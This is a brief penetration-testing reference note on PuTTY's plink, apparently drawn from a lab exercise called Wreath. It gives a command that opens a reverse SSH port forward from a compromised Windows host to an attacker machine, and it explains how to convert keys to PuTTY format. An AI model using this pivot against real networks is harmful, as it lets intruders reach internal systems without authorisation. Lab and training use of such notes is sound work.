# plink

PuTTY's command-line SSH client. Useful on Windows targets that lack OpenSSH but can execute uploaded binaries.

## Commands Used

### Reverse port forward from Windows

```cmd
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

Used on: **Wreath** - documented as a Windows reverse-forwarding fallback when a target can egress to the attacker but cannot be reached inbound.

Example:

```cmd
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
```

`echo y` accepts the SSH host key prompt non-interactively.

### Convert OpenSSH keys to PuTTY format

```bash
sudo apt install putty-tools
puttygen KEYFILE -o OUTPUT_KEY.ppk
```

Plink expects `.ppk` keys, not standard OpenSSH private keys.

## Related

- [ssh](ssh.md)
- [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md)
